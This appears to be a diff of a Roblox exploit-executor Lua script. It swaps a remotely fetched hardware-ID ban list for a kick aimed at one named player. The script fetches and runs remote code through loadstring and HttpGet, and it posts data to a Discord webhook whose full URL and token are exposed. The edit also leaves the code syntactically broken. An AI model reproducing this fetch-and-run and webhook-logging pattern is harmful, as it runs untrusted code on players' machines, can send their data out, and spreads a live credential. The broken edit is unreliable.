@@ -1,10 +1,7 @@
 
 local Alert = loadstring(game:HttpGet("https://raw.githubusercontent.com/AstroXTeam/Project-/refs/heads/main/Alert"))()
 Alert:create("Webhook Is Enabled!")
-local HWIDTable = loadstring(game:HttpGet("https://raw.githubusercontent.com/AstroXTeam/Project-/refs/heads/main/Banned"))()
- local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
-  for i,v in pairs(HWIDTable) do
-     If v == HWID then
+if game.players.LocalPlayer.Name == "assdddddg2" then
 game.Players.LocalPlayer:Kick("bye")
  else
 local Players = game:GetService("Players")
@@ -71,4 +68,3 @@ local Request = http_request or request or HttpPost or syn.request
 local Final = {Url = "https://discord.com/api/webhooks/1329954213811191913/gKQDWRFNoJjl2wIq6Ra8VazUAIx85EnKfTEXTwHa0e4gMuou3va-9hg0J53tFP_RnkrT", Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
   end
-end
